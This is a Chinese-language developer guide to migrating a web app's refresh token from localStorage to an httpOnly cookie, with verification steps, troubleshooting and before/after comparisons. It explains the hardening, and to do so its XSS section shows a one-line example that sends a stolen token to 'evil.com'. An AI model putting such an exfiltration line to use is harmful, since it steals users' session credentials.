# httpOnly Cookie 迁移指南

## 🎯 迁移概述

已将 Refresh Token 从 localStorage 迁移到 httpOnly Cookie，提升安全性。

### 迁移内容
- ✅ **后端**：Refresh Token 存储在 httpOnly Cookie 中
- ✅ **前端**：不再从 localStorage 读取 Refresh Token
- ✅ **SSE**：继续使用 URL 参数传递 Access Token（EventSource 限制）

---

## 🚨 重要：立即清除旧 Token

由于架构变更，旧的 Token 已失效。**请立即清除并重新登录**。

### 方法 1：浏览器控制台（推荐）

打开浏览器控制台（F12），运行：

```javascript
// 清除所有旧 token
localStorage.clear();
sessionStorage.clear();

// 清除所有 cookies
document.cookie.split(";").forEach(c => {
  document.cookie = c.trim().split("=")[0] + "=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/";
});

// 跳转到登录页
location.href = '/auth/login';
```

### 方法 2：手动清除

1. 打开浏览器开发者工具（F12）
2. 进入 Application / Storage 标签
3. 删除 Local Storage 中的所有项
4. 删除 Session Storage 中的所有项
5. 删除 Cookies 中的所有项
6. 刷新页面

---

## 🔍 如何验证迁移成功？

### 1. 检查 Cookie

登录后，在浏览器开发者工具中：
1. 打开 Application → Cookies
2. 应该看到 `refreshToken` Cookie：
   - ✅ **HttpOnly**: true
   - ✅ **Secure**: true（生产环境）
   - ✅ **SameSite**: Strict
   - ✅ **Max-Age**: 2592000（30天）

### 2. 检查 localStorage

登录后，在 localStorage 中：
- ✅ 应该有 `access_token`
- ✅ 应该有 `token_expiry`
- ❌ **不应该有** `refresh_token`（已迁移到 Cookie）

### 3. 检查网络请求

Token 刷新请求（`POST /api/auth/sessions/refresh`）：
- ✅ Request Body 为空
- ✅ Request Headers 包含 `Cookie: refreshToken=...`
- ✅ Response 不再包含 `refreshToken` 字段
- ✅ Response Headers 包含 `Set-Cookie: refreshToken=...`

### 4. 检查 SSE 连接

SSE 连接（`GET /api/v1/sse/notifications/events`）：
- ✅ URL 参数包含 `token=...`（Access Token）
- ✅ 连接成功，无 401 错误
- ✅ 能接收到 `connected` 事件

---

## 🛠 常见问题

### Q1: 登录后仍然报 401 错误？

**原因**：旧的 Access Token 仍在 localStorage 中，但已过期。

**解决**：
```javascript
// 清除旧 token
localStorage.removeItem('access_token');
localStorage.removeItem('token_expiry');
location.reload();
```

### Q2: SSE 连接失败（401）？

**原因**：Access Token 过期或无效。

**解决**：
1. 检查 localStorage 中的 `access_token` 是否存在
2. 检查 token 是否过期（解码 JWT payload 中的 `exp` 字段）
3. 如果过期，应该自动刷新（检查网络请求）
4. 如果刷新失败，清除所有 token 并重新登录

### Q3: Token 刷新失败（401）？

**原因**：Refresh Token Cookie 过期或被清除。

**解决**：
1. 检查 Cookie 中是否有 `refreshToken`
2. 检查 Cookie 是否过期（Max-Age）
3. 如果没有或已过期，需要重新登录

### Q4: 为什么 SSE 还是用 URL 参数传 token？

**原因**：`EventSource` API 不支持自定义请求头。

**说明**：
- Access Token 有效期短（1小时），风险可控
- httpOnly Cookie 只存储长期的 Refresh Token（30天）
- 这是业界标准做法

---

## 📊 迁移前后对比

### 迁移前 ❌

**登录响应**：
```json
{
  "accessToken": "eyJhbGci...",
  "refreshToken": "abc123...",  // ❌ 明文返回
  "expiresAt": 1763117514,
  "user": {...}
}
```

**Token 存储**：
- localStorage: `access_token`, `refresh_token` ❌
- Cookie: 无

**Token 刷新请求**：
```json
POST /api/auth/sessions/refresh
{
  "refreshToken": "abc123..."  // ❌ 从 localStorage 读取
}
```

---

### 迁移后 ✅

**登录响应**：
```json
{
  "accessToken": "eyJhbGci...",
  // ✅ refreshToken 不再返回
  "expiresAt": 1763117514,
  "user": {...}
}
```

**Response Headers**：
```
Set-Cookie: refreshToken=abc123...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000; Path=/
```

**Token 存储**：
- localStorage: `access_token`, `token_expiry` ✅
- Cookie: `refreshToken` (httpOnly) ✅

**Token 刷新请求**：
```json
POST /api/auth/sessions/refresh
{}  // ✅ Body 为空
```

**Request Headers**：
```
Cookie: refreshToken=abc123...  // ✅ 浏览器自动携带
```

---

## 🔐 安全性提升

### 防 XSS 攻击 ✅

**迁移前**：
```javascript
// ❌ 恶意脚本可以窃取 Refresh Token
const refreshToken = localStorage.getItem('refresh_token');
fetch('https://evil.com/steal', { method: 'POST', body: refreshToken });
```

**迁移后**：
```javascript
// ✅ JavaScript 无法访问 httpOnly Cookie
document.cookie; // 看不到 refreshToken
```

### 防 CSRF 攻击 ✅

**SameSite=Strict** 防止跨站请求：
```
Set-Cookie: refreshToken=...; SameSite=Strict
```

恶意网站无法利用你的 Cookie：
```html
<!-- ❌ 这个请求不会携带你的 refreshToken Cookie -->
<img src="https://yoursite.com/api/auth/sessions/refresh">
```

---

## 🎯 最佳实践

### 1. Access Token 仍在 localStorage

**为什么？**
- 短期有效（1小时）
- 需要在每个请求中携带（Authorization Header）
- 即使泄露，影响有限

### 2. Refresh Token 在 httpOnly Cookie

**为什么？**
- 长期有效（30天）
- 只用于刷新 Access Token
- httpOnly 防止 JavaScript 访问

### 3. SSE 使用 URL 参数

**为什么？**
- EventSource API 不支持自定义 Header
- 只传 Access Token（1小时有效期）
- WebSocket 也是类似做法

---

## 📝 测试清单

- [ ] 清除所有旧 Token
- [ ] 重新登录
- [ ] 检查 Cookie 中有 `refreshToken`
- [ ] 检查 localStorage 中**没有** `refresh_token`
- [ ] 等待 1 小时，验证 Access Token 自动刷新
- [ ] 验证 SSE 连接成功
- [ ] 验证 Dashboard 正常显示
- [ ] 验证所有 Widget 正常加载

---

## 🚀 后续优化（可选）

- [ ] 实现"记住我"功能（延长 Refresh Token 到 60 天）
- [ ] 添加 Session 管理页面（查看所有活跃会话）
- [ ] 添加远程登出功能（撤销其他设备的会话）
- [ ] 添加设备指纹验证
- [ ] 添加异地登录通知

---

**修改时间**：2025-11-14  
**优化内容**：Refresh Token 迁移到 httpOnly Cookie  
**测试状态**：待验证  
**相关文档**：TOKEN_REFRESH_OPTIMIZATION_COMPLETE.md
